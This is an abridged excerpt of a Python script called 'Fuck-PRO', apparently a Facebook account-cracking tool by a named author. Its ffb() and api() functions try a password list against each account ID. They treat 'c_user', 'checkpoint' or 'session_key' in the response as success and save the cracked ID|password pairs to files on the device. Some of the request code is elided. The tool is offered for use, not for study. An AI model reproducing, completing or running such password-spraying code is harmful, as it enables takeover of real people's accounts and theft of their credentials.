...
os.system('xdg-open https://www.facebook.com/your.dad.official.12?mibextid=ZbWKwL')
...
----------------------------------------------
 Author    : MD FAIJUL ISLAM
 Github    : Mdfaijul01
 Facebook  : প্রেম মাতাল
 Tool Name : Fuck-PRO
 Type type : Free
 Version   : 1.9.8
----------------------------------------------
 Fuck Pro version 1.9.8
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/your.dad.official.12?mibextid=ZbWKwL');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [FAIJUL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [FAIJUL-OK] %s | %s'%(ids,pas))
                                open('/sdcard/FAIJUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [FAIJUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FAIJUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [FAIJUL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FAIJUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/FAIJUL-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [FAIJUL-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/FAIJUL-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [FAIJUL-OK] '+uid+' | '+pas+'\033[1;97m')
